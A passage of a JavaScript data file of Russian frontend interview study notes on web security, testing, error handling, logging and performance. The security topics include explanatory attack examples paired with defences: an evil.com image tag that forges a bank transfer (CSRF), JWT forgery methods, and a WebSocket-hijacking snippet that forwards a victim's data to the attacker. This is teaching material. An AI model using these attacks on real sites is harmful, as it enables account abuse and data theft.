javascript:\n\`\`\`\n\n**Полная защита:**\n• React JSX — включена по умолчанию\n• Санитизация через DOMPurify перед dangerouslySetInnerHTML\n• CSP заголовок — запрещает inline-скрипты и внешние домены\n• HttpOnly cookies — украденные через XSS куки нельзя прочитать через JS\n• Валидация href/src атрибутов если они из пользовательских данных`, score: 3.5 },
      { name: 'CSRF', level: '3', content: `**CSRF (Cross-Site Request Forgery)** — атака при которой браузер жертвы отправляет запрос на доверенный сайт от её имени, без её ведома.\n\n**Почему это работает — браузер автоматически шлёт куки:**\n\`\`\`\n1. Пользователь залогинен на bank.com (в браузере есть cookie с сессией)\n2. Пользователь заходит на evil.com\n3. evil.com содержит:\n   <img src="https://bank.com/transfer?to=attacker&amount=10000">\n   или форму которая автоматически сабмитится через JS\n4. Браузер делает запрос на bank.com — и автоматически прикрепляет cookie\n5. Банк видит валидную сессию и выполняет перевод\n\`\`\`\nПользователь ничего не нажимал — браузер сделал всё сам.\n\n**Защита 1 — CSRF-токен:**\nСервер генерирует уникальный случайный токен, кладёт его в форму (скрытое поле) и в сессию. При запросе сравнивает. Атакующий не знает этот токен — не может сформировать валидный запрос:\n\`\`\`html\n<form action="/transfer" method="POST">\n  <input type="hidden" name="csrf_token" value="r4nd0m_s3cr3t">\n  ...\n</form>\n\`\`\`\n\n**Защита 2 — SameSite cookie:**\nАтрибут куки, указывающий браузеру когда слать куки в кросс-доменных запросах:\n\`\`\`\nSameSite=Strict  — куки шлются ТОЛЬКО при навигации с того же домена.\n                   Даже переход по ссылке с другого сайта не пришлёт куки.\n                   Ломает OAuth-редиректы — редко используют для session cookie.\n\nSameSite=Lax     — куки шлются при навигации (ссылки, адресная строка),\n                   но НЕ при автоматических запросах (img, form POST, XHR).\n                   Дефолт в современных браузерах. Хороший баланс.\n\nSameSite=None    — куки шлются всегда. Требует Secure (только HTTPS).\n                   Для третьесторонних куки (трекинг, виджеты).\n\`\`\`\nLax защищает от большинства CSRF-атак — форма на evil.com, сабмитящаяся в bank.com, не получит куки.\n\n**Защита 3 — проверка Origin/Referer заголовка:**\nСервер проверяет откуда пришёл запрос. Если Origin не совпадает с доверенным доменом — отклоняет.\n\n**Почему JWT в Authorization header защищает от CSRF:**\nБраузер автоматически шлёт только куки. Authorization header атакующий из кросс-доменного запроса добавить не может — для этого нужен JS, а JS заблокирует CORS. Поэтому API с токеном в заголовке CSRF-безопасны без дополнительных мер.`, score: 3.5 },
      { name: 'Безопасность JWT', level: '3', content: `**JWT (JSON Web Token)** — три части через точку: \`header.payload.signature\`, каждая в Base64.\n\`\`\`\neyJhbGciOiJIUzI1NiJ9  ← header: { alg: "HS256" }\n.eyJ1c2VySWQiOjQyfQ    ← payload: { userId: 42, exp: 1716000000 }\n.SflKxwRJSMeKKF2QT4fw  ← подпись (HMAC SHA256 от header+payload с секретным ключом)\n\`\`\`\n\n**JWT не шифрует — только подписывает.** Payload декодируется любым base64-декодером без ключа. Не класть в payload: пароли, секреты, персональные данные которые не должны видеть клиенты.\n\n**Уязвимость 1 — alg=none:**
Payload и header JWT не зашифрованы — их можно изменить. Атакующий берёт валидный токен, меняет \`role: "user"\` на \`role: "admin"\` в payload, меняет \`alg\` на \`none\` в header, убирает подпись. Некоторые библиотеки принимали такой токен как валидный — раз алгоритм "none", проверять нечего.
\`\`\`js
// Уязвимо — библиотека доверяет алгоритму из самого токена:
jwt.verify(token, secret);

// Безопасно — явно указать какой алгоритм ожидаем:
jwt.verify(token, secret, { algorithms: ['HS256'] });
\`\`\`

**Уязвимость 2 — algorithm confusion (RS256 → HS256):**
RS256 — асимметричный: сервер подписывает **приватным** ключом, проверяет **публичным**. Публичный ключ открыт — его можно найти (часто отдаётся на \`/.well-known/jwks.json\`).

Атака: взять публичный ключ сервера, поменять \`alg\` в header на \`HS256\` (симметричный), подписать изменённый payload этим публичным ключом как HMAC-секретом. Уязвимая библиотека при проверке видит \`alg: HS256\`, берёт тот же публичный ключ как секрет для HMAC и подпись сходится.
\`\`\`js
// Защита — та же: явно указывать алгоритм:
jwt.verify(token, publicKey, { algorithms: ['RS256'] }); // HS256 будет отклонён
\`\`\`

**Уязвимость 3 — слабый секрет (brute force):**
HS256 — HMAC с секретным ключом. Подпись можно проверить офлайн без запросов к серверу. Если секрет слабый (\`secret\`, \`password\`, \`123456\`) — атакующий брутфорсит его по словарю и получает возможность подписывать любые токены.

Защита: секрет минимум 256 бит случайных данных (\`crypto.randomBytes(32).toString('hex')\`), или переходить на RS256 где приватный ключ никогда не передаётся.

**Уязвимость 4 — отсутствие проверки exp:**
Если сервер не проверяет поле \`exp\` — протухший токен продолжает работать вечно. Некоторые библиотеки не проверяют по умолчанию.
\`\`\`js
jwt.verify(token, secret); // большинство библиотек проверяют exp автоматически
// но стоит убедиться что это именно так
\`\`\`

**Нельзя мгновенно инвалидировать:**
JWT stateless — сервер не хранит список токенов. Украденный access token работает до истечения \`exp\`. Решения:
• Короткий срок жизни access token (15 мин) — украденный быстро протухнет
• Blacklist по \`jti\` (уникальный id токена) в Redis — нарушает stateless, но даёт мгновенную инвалидацию
• Версия в payload + поле в БД — при логауте инкрементировать, при запросе сравнивать\n\n**Где хранить (повторение из темы Auth, ключевое):**\n\`\`\`\nlocalStorage  — читается JS → украдут через XSS ❌\nCookie без httpOnly — то же самое ❌\nhttpOnly cookie — JS не читает, CSRF защищён SameSite=Lax ✅\nin-memory (переменная) — исчезает при перезагрузке, самое безопасное ✅\n\`\`\`\n\n**Когда JWT лучше session:**\nМикросервисы — каждый сервис проверяет подпись локально без запроса к хранилищу сессий. Горизонтальное масштабирование — не нужен общий Redis.`, score: 3.5 },
      { name: 'Работа SSL/TLS', level: '4', content: `**TLS (Transport Layer Security)** — протокол шифрования соединения. SSL — его устаревший предшественник, название часто используют как синоним хотя SSL давно не применяется.\n\n**Зачем нужен TLS:**\nБез шифрования все данные передаются в открытом виде. Любой узел на пути (провайдер, роутер, публичный Wi-Fi) может прочитать или подменить их. MITM (Man-in-the-Middle, "человек посередине") — атакующий встаёт между клиентом и сервером, перехватывает и при желании изменяет трафик. Обе стороны думают что говорят напрямую.\n\nTLS решает три задачи:\n• **Шифрование** — данные нечитаемы для третьих лиц\n• **Аутентификация сервера** — клиент уверен что говорит именно с bank.com, а не с подменой\n• **Целостность** — данные не изменены в пути. Проверяется через MAC (Message Authentication Code) — криптографическая контрольная сумма сообщения\n\n**TLS Handshake — как устанавливается защищённое соединение (TLS 1.3):**\n\`\`\`\n1. ClientHello\n   Клиент → сервер: список поддерживаемых алгоритмов шифрования,\n   случайное число (client random)\n\n2. ServerHello + Certificate + Key Exchange\n   Сервер → клиент: выбранный алгоритм, свой публичный ключ\n   для обмена по алгоритму Диффи-Хеллмана, сертификат\n\n3. Клиент проверяет сертификат:\n   - Подпись валидна? (доверяем CA из системного хранилища)\n   - Домен совпадает? Смотрим CN (Common Name — поле с доменом)\n     или SAN (Subject Alternative Name — список альтернативных доменов,\n     например *.example.com)\n   - Не истёк? (срок действия)\n\n4. Обмен ключами по алгоритму Диффи-Хеллмана (DH):\n   Клиент и сервер каждый генерируют свою пару ключей,\n   обмениваются публичными частями и независимо вычисляют\n   один и тот же сессионный ключ — не передавая его по сети.\n   Математика устроена так что зная только публичные части\n   вычислить ключ третьей стороне практически невозможно.\n\n5. Всё дальнейшее шифруется сессионным ключом\n   алгоритмом AES (Advanced Encryption Standard) —\n   симметричный блочный шифр, стандарт индустрии\n\`\`\`\nTLS 1.3 — 1 RTT (Round Trip Time, одно время туда-обратно) вместо 2 у TLS 1.2. Соединение устанавливается быстрее.\n\n**Сертификаты и цепочка доверия:**\nСертификат содержит: домен, публичный ключ сервера, подпись выдавшего CA.\nCA (Certificate Authority) — организация-удостоверяющий центр, чьи корневые сертификаты встроены в ОС и браузеры. Браузер им доверяет изначально.\n\nЦепочка: Root CA (встроен в систему) → Intermediate CA (промежуточный) → Сертификат сайта. Браузер идёт по цепочке и проверяет каждую подпись.\n\nLet's Encrypt — бесплатный CA, выдаёт сертификаты автоматически через ACME-протокол (Automated Certificate Management Environment — стандартный протокол для автоматического получения и обновления сертификатов). Certbot — популярный ACME-клиент.\n\n**HSTS (HTTP Strict Transport Security)** — заголовок который браузер запоминает:\n\`\`\`\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n\`\`\`\nПосле первого получения браузер год (31536000 секунд) будет автоматически открывать этот домен по HTTPS, игнорируя http://. Защита от SSL stripping — атаки где злоумышленник перехватывает первый HTTP-запрос до редиректа на HTTPS и держит жертву на незашифрованном соединении.`, score: 3.5 },
      { name: 'Организация безопасности при реализации WebSocket-ов', level: '4', content: `**Чем WebSocket отличается от HTTP с точки зрения безопасности:**\nWebSocket — persistent-соединение (постоянное, не закрывается после ответа). После установки handshake (HTTP Upgrade → WebSocket) между клиентом и сервером открыт постоянный двусторонний канал. Это меняет модель угроз: атакующий может влиять не на один запрос, а на весь поток сообщений на протяжении сессии.\n\n**Угроза 1 — CSWSH (Cross-Site WebSocket Hijacking, межсайтовый перехват WebSocket):**\nАналог CSRF для WebSocket. WebSocket-handshake — это обычный HTTP-запрос, и браузер автоматически прикрепляет к нему куки. Атакующий с evil.com может открыть WebSocket-соединение с victim.com от имени залогиненной жертвы:\n\`\`\`js\n// Код на evil.com:\nconst ws = new WebSocket('wss://victim.com/ws');\n// Браузер прикрепит куки жертвы к handshake-запросу\nws.onmessage = (e) => sendToAttacker(e.data); // читает приватные данные жертвы\n\`\`\`\n\n**Защита от CSWSH — проверка заголовка Origin при handshake:**\n\`\`\`js\n// Сервер при обработке WebSocket upgrade-запроса:\nconst origin = request.headers['origin'];\nconst allowedOrigins = ['https://mysite.com', 'https://app.mysite.com'];\n\nif (!allowedOrigins.includes(origin)) {\n  socket.destroy(); // отклонить соединение\n  return;\n}\n\`\`\`\nOrigin — это заголовок который браузер выставляет сам и не позволяет JS его подделать. С curl или Postman можно выставить любой Origin — но это атаки не из браузера, там нет куки жертвы.\n\n**Угроза 2 — отсутствие аутентификации:**\nWebSocket сам по себе не имеет встроенной аутентификации. Проверять кто подключается нужно явно. Три подхода:\n\`\`\`js\n// Вариант 1 — токен в URL (не рекомендуется: токен попадает в логи сервера):\nnew WebSocket('wss://api.com/ws?token=eyJhbGc...');\n\n// Вариант 2 — первым сообщением сразу после подключения:\nws.onopen = () => {\n  ws.send(JSON.stringify({ type: 'auth', token: getAccessToken() }));\n};\n// Сервер ждёт auth-сообщение, при неверном токене — закрывает соединение\n// Другие сообщения до аутентификации игнорировать!\n\n// Вариант 3 — httpOnly cookie + проверка Origin (если сессия в куки)\n// Origin защищает от CSWSH, cookie передаётся браузером автоматически\n\`\`\`\n\n**Угроза 3 — инъекции через входящие сообщения:**\nВсе данные от клиента — потенциально вредоносные. WebSocket не ограничивает формат сообщений — можно слать что угодно:\n\`\`\`js\nws.on('message', (raw) => {\n  let msg;\n  try {\n    msg = JSON.parse(raw);\n  } catch {\n    ws.close(1003, 'Invalid format'); // 1003 — unsupported data\n    return;\n  }\n\n  // Проверить схему: ожидаемые поля, типы, длину строк\n  if (!isValidMessage(msg)) {\n    ws.close(1008, 'Policy violation');\n    return;\n  }\n\n  // Дальше работать только с проверенными данными\n  // Не передавать в eval, innerHTML, SQL без обработки\n});\n\`\`\`\n\n**Угроза 4 — flood (флуд) / DDoS (Distributed Denial of Service — распределённая атака отказа в обслуживании):**\nОдин клиент может отправлять тысячи сообщений в секунду, перегружая сервер. Rate limiting (ограничение частоты) на уровне соединения:\n\`\`\`js\n// Простой rate limiter: не более 10 сообщений в секунду\nconst msgCount = new Map(); // connectionId → count\n\nws.on('message', (data) => {\n  const count = (msgCount.get(ws.id) ?? 0) + 1;\n  msgCount.set(ws.id, count);\n  if (count > 10) {\n    ws.close(1008, 'Rate limit exceeded');\n    return;\n  }\n  // Сбрасывать счётчик каждую секунду\n});\n\`\`\`\n\n**WSS (WebSocket Secure)** — WebSocket поверх TLS (аналог HTTPS для WebSocket). Всегда использовать в продакшне: шифрует весь канал, защищает от перехвата и подмены сообщений в пути. \`ws://\` — открытый текст, \`wss://\` — зашифровано.`, score: 3.5 },
    ],
  },
  {
    id: 'testing',
    title: 'ТЕСТИРОВАНИЕ',
    icon: '🧪',
    color: '#26A69A',
    topics: [
      { name: 'Паттерн AAA (Arrange Act Assert)', level: '2', content: `\`\`\`js\n// Arrange — подготовка\nconst calculator = new Calculator();\n\n// Act — действие\nconst result = calculator.add(2, 3);\n\n// Assert — проверка\nexpect(result).toBe(5);\n\`\`\`\n\nКаждый тест — одно действие, одна проверка. Чистый и читаемый.` },
      { name: 'Моки. Зачем нужны и как применять', level: '3', content: `**Mock** — подделка зависимости с контролируемым поведением.\n\n\`\`\`js\nconst mockFetch = jest.fn().mockResolvedValue({ json: () => ({ name: 'Alice' }) });\nglobal.fetch = mockFetch;\n\nawait loadUser();\n\nexpect(mockFetch).toHaveBeenCalledWith('/api/user');\n\`\`\`\n\nЗачем: изоляция тестируемого кода, предсказуемость, скорость (не ждём реальный API).` },
      { name: 'Stub, Spy. Зачем нужны и как применять', level: '3', content: `**Stub** — заглушка, возвращающая фиксированное значение. Не проверяем вызов.\n\`\`\`js\nconst getUser = jest.fn().mockReturnValue({ name: 'Alice' });\n\`\`\`\n\n**Spy** — наблюдатель, следит за вызовами реального метода без подмены:\n\`\`\`js\nconst spy = jest.spyOn(console, 'log');\ndoSomething();\nexpect(spy).toHaveBeenCalledWith('done');\nspy.mockRestore();\n\`\`\`\n\n**Mock** = Stub + Spy (подменяет и отслеживает).` },
      { name: 'Принцип TDD', level: '3', content: `**TDD (Test-Driven Development):**\n1. **Red** — пишем тест → он падает (функционал не реализован)\n2. **Green** — пишем минимальный код, чтобы тест прошёл\n3. **Refactor** — улучшаем код, тесты продолжают проходить\n\nПреимущества: лучший дизайн кода, высокое покрытие, документация через тесты, уверенность при рефакторинге.` },
      { name: 'Интеграционные и e2e тесты (cypress / playwright)', level: '3', content: `**Unit** — одна функция/компонент в изоляции.
**Интеграционные** — несколько модулей вместе (компонент + API, несколько компонентов).
**E2E** — полный пользовательский сценарий в реальном браузере от начала до конца.

**Cypress:**
Тест живёт внутри браузера — прямой доступ к DOM без WebDriver. Только JS/TS.
• **Auto-retry** — каждая команда ждёт элемент до 4 сек, не нужен sleep/waitFor
• **Time-travel debugging** — в Cypress UI каждый шаг сохраняет снимок DOM, можно пройтись по шагам и увидеть состояние страницы в любой момент
• **cy.intercept()** — перехват и мок сетевых запросов
• **cy.session()** — кешировать состояние авторизации между тестами (не логиниться заново каждый тест)
• **Кастомные команды** — \`Cypress.Commands.add('login', ...)\` для переиспользования действий
• Ограничения: только Chromium + Firefox (слабо), нет нативно нескольких вкладок, один origin за раз

**Playwright:**
От Microsoft. Процесс теста вне браузера, управляет через CDP. TS/JS/Python/Java/C#.
• **Кросс-браузерность** — Chromium, Firefox, WebKit (Safari-движок) из коробки
• **Auto-wait** — аналогично Cypress, ждёт видимость и стабильность элемента
• **Параллельность из коробки** — несколько workers без настройки, быстрее на CI
• **Несколько вкладок и cross-origin** — нативная поддержка
• **Мобильная эмуляция** — \`devices['iPhone 13']\` с точными метриками
• **Trace Viewer** — полная запись теста: DOM, сеть, консоль, таймлайн (\`npx playwright show-trace\`)
• **Codegen** — \`npx playwright codegen url\` генерирует тест записью действий в браузере
• **Fixtures** — изолированное переиспользуемое состояние для тестов (логин один раз → передать в тест)

**Когда что выбрать:**
\`\`\`
Cypress:    быстрый старт, отличный DX, удобная отладка через UI
Playwright: нужна кросс-браузерность, скорость на CI, несколько вкладок,
            мобильная эмуляция или сложные multi-origin сценарии
\`\`\`
Оба используют \`data-testid\` как рекомендуемый селектор — не зависит от CSS и текста.` },
      { name: 'Пирамида тестирования, инструменты для каждого уровня', level: '3', content: `\`\`\`\n       /  E2E  \\       — мало, медленные, дорогие\n      / Integration \\   — средне\n     /    Unit       \\  — много, быстрые, дешёвые\n\`\`\`\n\n**Unit:** Jest, Vitest, React Testing Library\n**Integration:** Jest + MSW (Mock Service Worker), Supertest\n**E2E:** Cypress, Playwright\n\n**Перевёрнутая пирамида** — антипаттерн: много E2E, мало Unit. Медленные, хрупкие тесты.` },
      { name: 'Coverage. Инструменты и принцип работы', level: '4', content: `**Coverage** — процент кода, выполненного при прогоне тестов.\n\n**Метрики:**\n• **Statements** — % выполненных выражений\n• **Branches** — % пройденных ветвлений (if/else, switch)\n• **Functions** — % вызванных функций\n• **Lines** — % выполненных строк\n\n**Инструменты:** istanbul/nyc, Jest --coverage, Vitest --coverage, c8.\n\n**Важно:** 100% coverage ≠ качественные тесты. Можно покрыть всё без проверки правильности. Coverage — метрика полноты, не качества.\n\n**Три реальных проблемы с целью "100% coverage":**\n\n**1. Бесполезные тесты ради метрики**\nРазработчики пишут тесты без assertions — только чтобы прогнать код и поднять цифру:\n\`\`\`js\nit('runs without errors', () => {\n  formatDate(new Date()); // нет expect() — баг пройдёт незамеченным\n});\n\`\`\`\n\n**2. Некоторый код не стоит тестировать**\nКонфиги, сгенерированный код, тривиальные геттеры — покрывать их тестами пустая трата времени. Цель 100% заставляет писать тесты там, где от них нет пользы:\n\`\`\`js\nclass Config {\n  getTimeout() { return 5000; } // тест на этот геттер ничего не доказывает\n}\n\`\`\`\n\n**3. Ложное чувство безопасности**\n100% coverage не гарантирует корректность. Тесты могут не проверять граничные случаи:\n\`\`\`js\nfunction divide(a, b) { return a / b; }\n\nit('divides numbers', () => {\n  expect(divide(10, 2)).toBe(5); // coverage 100%\n  // но divide(10, 0) → Infinity не проверяется\n  // divide('10', 2) → 5 (неявное приведение) не проверяется\n});\n\`\`\`\n\nПрактика: целевой порог 80–90% на критических модулях. Не гонятся за 100% — фокус на тестировании граничных случаев и бизнес-логики.` },
      { name: 'Unit тестирование', level: '2', content: `Тестирование отдельной функции/компонента в изоляции.\n\n**React Testing Library:**\n\`\`\`js\nrender(<Button label="Click" onClick={mockFn} />);\nconst btn = screen.getByText('Click');\nfireEvent.click(btn);\nexpect(mockFn).toHaveBeenCalled();\n\`\`\`\n\nПринцип: тестируй поведение, не реализацию. Query по тексту/роли, не по className.` },
    ],
  },
  {
    id: 'exceptions',
    title: 'ОБРАБОТКА ИСКЛЮЧЕНИЙ, ЛОГИРОВАНИЕ, ДЕБАГ',
    icon: '🐛',
    color: '#FF7043',
    topics: [
      { name: 'try-catch', level: '2', content: `\`\`\`js
async function getData() {
  try {
    const res = await fetch('/api');
    if (!res.ok) throw new NetworkError(res.status);
    return await res.json();
  } catch (err) {
    if (err instanceof NetworkError) showNetworkError(err.status);
    else throw err; // незнакомые ошибки всегда пробрасывай — не глотай молча!
  } finally {
    setLoading(false); // выполнится всегда — даже если в try есть return
  }
}
\`\`\`

**Объект ошибки:**
\`\`\`js
err.name      // 'TypeError', 'NetworkError' и т.д.
err.message   // текст ошибки
err.stack     // стектрейс с файлами и строками
\`\`\`
Встроенные типы: **Error** (базовый), **TypeError** (неправильный тип), **ReferenceError** (переменная не найдена), **SyntaxError** (синтаксис), **RangeError** (значение вне диапазона).

**try-catch ловит только синхронные ошибки:**
\`\`\`js
try {
  setTimeout(() => { throw new Error('!'); }, 100); // ❌ не поймает
  fetch('/api').then(r => r.json());                // ❌ не поймает
} catch (e) { }

// ✅ С await — работает:
try {
  const res = await fetch('/api');   // await "раскрывает" rejected Promise
  if (!res.ok) throw new Error(\`HTTP \${res.status}\`);
  return await res.json();
} catch (e) { /* поймает сетевую ошибку и throw выше */ }
\`\`\`

**Custom Error — разделение типов в catch:**
\`\`\`js
class NetworkError extends Error {
  constructor(status) {
    super(\`HTTP \${status}\`);
    this.name = 'NetworkError';
    this.status = status;
  }
}
class ValidationError extends Error {
  constructor(fields) {
    super('Validation failed');
    this.name = 'ValidationError';
    this.fields = fields;
  }
}
\`\`\`

**Глобальная обработка ошибок:**
\`\`\`js
// Синхронные ошибки (скрипты, не React):
window.addEventListener('error', (event) => {
  sendToSentry(event.error);
});

// Необработанные промисы (забыли .catch() или await):
window.addEventListener('unhandledrejection', (event) => {
  sendToSentry(event.reason);
  event.preventDefault(); // не показывать ошибку в консоли
});
\`\`\`

**ErrorBoundary** — ловит ошибки рендера в React (только class-компоненты):
\`\`\`jsx
class ErrorBoundary extends React.Component {
  state = { hasError: false };
  static getDerivedStateFromError() { return { hasError: true }; }
  componentDidCatch(error, info) { sendToSentry(error, info); }
  render() {
    return this.state.hasError ? <FallbackUI /> : this.props.children;
  }
}
\`\`\`
ErrorBoundary **не ловит:** обработчики событий (onClick), setTimeout/fetch, SSR, ошибки внутри самого ErrorBoundary.
Нужны оба механизма: ErrorBoundary → ошибки рендера, window handlers → всё остальное.` },
      { name: 'Способы дебага клиентского кода', level: '2', content: `**console-методы:**
\`\`\`js
console.log('лог');
console.warn('предупреждение');
console.error('ошибка');
console.dir(element);           // DOM-элемент как объект со свойствами
console.table(arrayOfObjects);  // данные таблицей — удобно для массивов
console.group('Запрос');        // группировка вывода
console.log('url:', url);
console.groupEnd();
console.time('fetch');          // начать замер
console.timeEnd('fetch');       // fetch: 234ms
console.count('клик');          // счётчик вызовов
console.trace();                // стектрейс в текущем месте
\`\`\`

**debugger** — браузер остановится на этой строке:
\`\`\`js
function calculate(x) {
  debugger; // ⚠️ удаляй перед коммитом!
  return x * 2;
}
\`\`\`

**Breakpoints в DevTools:**
• **Line breakpoint** — клик на номер строки в Sources
• **Conditional breakpoint** — останавливает только при выполнении условия
• **DOM breakpoint** — при изменении DOM-узла (subtree, attribute, removal)
• **XHR/Fetch breakpoint** — при запросе на URL по паттерну
• **Event listener breakpoint** — при срабатывании любого события (click, keydown...)
• **Exception breakpoint** — при любой ошибке (caught или uncaught)

**Source Maps** — связывают минифицированный код с оригинальным:
\`\`\`
Без source map:  TypeError at a:1:23456
С source map:    TypeError at calculateUserAge src/utils.ts:14:5
\`\`\`
\`\`\`js
// webpack: module.exports = { devtool: 'source-map' }
// vite:    export default { build: { sourcemap: true } }
\`\`\`
⚠️ Не отдавай source maps публично в продакшне — раскрывают исходный код. Загружай только в Sentry.

**Network tab** — запросы, статусы, заголовки, тело ответа.
**Performance tab** — flame chart, что блокирует main thread.
**React DevTools** — дерево компонентов, props, state, profiler (перерендеры).` },
      { name: 'redux/react/альтернативы devtools', level: '3', content: `**React DevTools:** дерево компонентов, props, state, hooks, profiler (перерендеры), highlight updates.\n\n**Redux DevTools:** time-travel debugging, просмотр всех actions и state diff, импорт/экспорт состояния.\n\n**Vue DevTools, MobX DevTools, Zustand DevTools** — аналогичные инструменты для своих экосистем.` },
      { name: 'Настройка логирования ошибок (sentry, prometheus и др.)', level: '4', content: `**Sentry** — сервис мониторинга ошибок и производительности. Перехватывает ошибки в продакшне и отправляет детальные отчёты.

**Стектрейс** — цепочка вызовов функций, которая привела к ошибке. Читается снизу вверх: нижний фрейм — место где упало, выше — все вызовы которые к нему привели:
\`\`\`
Error: Cannot read properties of undefined
  at getUserName  (user.js:12)      ← здесь упало
  at renderProfile (profile.js:34)  ← вызвал getUserName
  at App.render    (App.js:8)       ← вызвал renderProfile
\`\`\`
В браузере без source maps стектрейс указывает на минифицированный бандл — имена вида \`a\`, \`t\`, строка 1 колонка 84732. Sentry использует source maps и показывает оригинальный TS/JSX с нормальными именами и номерами строк.

**Что Sentry даёт из коробки:**

**1. Source maps** — разворачивает минифицированный стектрейс в читаемый оригинальный код. Самому реализовать: загружать карты на сервер, хранить их, разворачивать при каждой ошибке.

**2. Группировка ошибок (fingerprinting)** — одна ошибка от 1000 пользователей не создаёт 1000 тикетов. Sentry группирует похожие ошибки по стектрейсу и показывает "произошла 1000 раз у 300 пользователей". Самому реализовать: алгоритм дедупликации, хранилище, UI.

**3. Контекст ошибки** — автоматически собирает браузер, ОС, URL, версию релиза, breadcrumbs (последние действия пользователя перед ошибкой), состояние Redux/Vuex если настроено, кастомные теги.

**4. Алерты и интеграции** — уведомления в Slack/Email при новой ошибке или резком росте. Интеграция с Jira — автоматически создаёт тикет.

**5. Performance monitoring** — не только ошибки, но и медленные транзакции, N+1 запросы, медленный рендер. Пересечение с Prometheus/Grafana по назначению.

**6. Releases** — привязка ошибок к конкретному деплою. Видишь: "после v2.3.1 эта ошибка появилась впервые". Sentry подтягивает коммиты из GitHub/GitLab автоматически.

**Установка:**
\`\`\`js
// npm install @sentry/react
import * as Sentry from '@sentry/react';

Sentry.init({
  dsn: 'https://xxx@sentry.io/xxx',
  environment: 'production',
  tracesSampleRate: 0.1, // 10% запросов для мониторинга производительности
});
\`\`\`

**Ручная отправка + контекст:**
\`\`\`js
try {
  await fetchData();
} catch (err) {
  Sentry.captureException(err);
}

Sentry.setUser({ id: userId, email: userEmail });
Sentry.setTag('feature', 'checkout');
Sentry.addBreadcrumb({ message: 'Нажал кнопку оплаты', level: 'info' });
\`\`\`

**ErrorBoundary от Sentry** — автоматически отправляет ошибки рендера:
\`\`\`jsx
import { ErrorBoundary } from '@sentry/react';
<ErrorBoundary fallback={<ErrorPage />}><App /></ErrorBoundary>
\`\`\`

**Prometheus** — мониторинг метрик во времени. Реагирует на "как система себя чувствует". Каждые N секунд собирает числовые показатели (CPU, память, количество запросов, время ответа, кастомные метрики) и хранит их как временные ряды.

Prometheus обычно используется в связке:
• **Grafana** — визуализация метрик в виде графиков и дашбордов
• **Alertmanager** — алерты при превышении порогов (CPU > 80%, p99 latency > 2s)

Sentry vs Prometheus: Sentry — "что именно сломалось и у кого", Prometheus — "насколько здорова система в целом". В продакшне нужны оба.

**Другие инструменты:**
• **LogRocket / FullStory** — session replay: запись сессии до ошибки + логи
• **Datadog** — мониторинг + метрики + логи (fullstack, платная альтернатива связке Sentry + Prometheus)
• **Winston / Pino** — логгеры для Node.js с уровнями и форматами` },
      { name: 'Понимание принципа выделения программных узлов для логирования', level: '4', content: `**Уровни логирования:**
\`\`\`
DEBUG  — детальная отладка (только dev, в продакшн не пишем)
INFO   — обычные события: пользователь залогинился, запрос выполнен
WARN   — предупреждения: deprecated API, медленный запрос, retry
ERROR  — ошибки которые не сломали приложение: упал один запрос
FATAL  — критические: приложение не может работать
\`\`\`
В продакшне логируют **WARN и выше**.
\`\`\`js
console.debug('детали запроса:', payload);     // только dev
console.info('пользователь залогинился:', id);
console.warn('устаревший метод, используй X');
console.error('ошибка загрузки:', error);
\`\`\`

**Что логировать (программные узлы):**
• **API-вызовы** — url, метод, статус ответа, время выполнения, ошибки
• **Действия пользователя** — навигация, ключевые клики (оформление заказа, оплата)
• **Ошибки рендеринга** — через ErrorBoundary + componentDidCatch
• **Бизнес-логика** — переходы состояний, транзакции, важные решения
• **Производительность** — операции дольше порога (> 1s), медленные рендеры

**Не логировать** — чувствительные данные: пароли, токены, email, телефоны, данные карт. Нарушение GDPR → штрафы.

**Принцип:** логировать нужно на **границах системы** — вход/выход API, смена состояний, места где что-то может пойти не так. Внутренние детали реализации логировать не нужно — они меняются и засоряют логи.` },
    ],
  },
  {
    id: 'perf',
    title: 'ПРОИЗВОДИТЕЛЬНОСТЬ',
    icon: '🚀',
    color: '#FFC107',
    topics: [
      { name: 'Инструменты проверки производительности (devtools, lighthouse)', level: '2', content: `**Lighthouse** — встроенный аудит в DevTools (вкладка Lighthouse).
5 категорий: **Performance** — скорость загрузки, **Accessibility** — доступность (aria, контраст, tabindex), **Best Practices** — HTTPS, console errors, **SEO** — meta, заголовки, **PWA** — соответствие требованиям.
Даёт оценку 0–100 и конкретные рекомендации с объяснениями.
\`\`\`bash
npx lighthouse https://site.com --view  # запуск из CLI
\`\`\`

**Performance вкладка** — запись и анализ в реальном времени:
Record → выполняешь действия → Stop. Что видно:
• **FPS** — кадры в секунду (должно быть 60)
• **Main thread** — что выполняется в главном потоке, flame chart стека вызовов
• **Long Tasks** — задачи дольше 50ms (блокируют UI, выделены красным)
• **Timings** — метрики FCP, LCP, CLS на таймлайне

Как найти проблему: найти красный Long Task → кликнуть → увидишь какая функция виновата → оптимизировать или перенести в Web Worker.

**Network вкладка** — порядок и время загрузки ресурсов:
\`\`\`
Waterfall: DNS Lookup → TCP → TLS → Request → Response
\`\`\`
• **Disable cache** — тестировать без кэша
• **Throttling** — симуляция медленного интернета (3G, 4G)
• Смотреть: Size (размер), Time (время), серая полоска = ожидание соединения, параллельность waterfall

**Memory вкладка** — анализ утечек памяти:
• **Heap Snapshot** — снимок памяти в момент времени. Take snapshot → действие → Take snapshot. Сравни два снимка — что выросло?
• **Allocation Timeline** — кто выделяет память во времени. Синие полосы = выделение, серые = GC очистил, синие которые остались = утечка.
• **Allocation Sampling** — какие функции потребляют память (меньше overhead чем Timeline)

**Частые причины утечек памяти:**
\`\`\`js
// Незакрытые подписки и таймеры:
useEffect(() => {
  emitter.on('event', handler);
  const id = setInterval(fn, 1000);
  return () => {
    emitter.off('event', handler); // обязательно!
    clearInterval(id);             // обязательно!
  };
}, []);

// Глобальные переменные — никогда не удалятся:
window.myData = hugeArray; // ❌

// Замыкания держащие большие объекты:
function createClosure() {
  const hugeData = new Array(1000000).fill('x');
  return () => hugeData[0]; // hugeData не удалится пока жива функция
}
\`\`\`

**Coverage вкладка** — какой JS/CSS код не используется:
DevTools → More tools → Coverage → Record. Красный = не используется → кандидат для удаления или lazy load.

**Rendering вкладка** — визуализация перерисовок:
DevTools → More tools → Rendering → Paint flashing (подсвечивает перерисовки), FPS meter (показывает FPS в реальном времени).

**WebPageTest** — тестирование из разных локаций и устройств (реальные условия, не localhost).` },
      { name: 'Preload, prefetch, async, defer', level: '2', content: `**Scripts:**
\`\`\`html
<script src="app.js"></script>           <!-- блокирует парсинг -->
<script src="app.js" async></script>     <!-- загружает параллельно, выполняет сразу -->
<script src="app.js" defer></script>     <!-- загружает параллельно, выполняет после парсинга -->
\`\`\`

**Resource hints:**
\`\`\`html
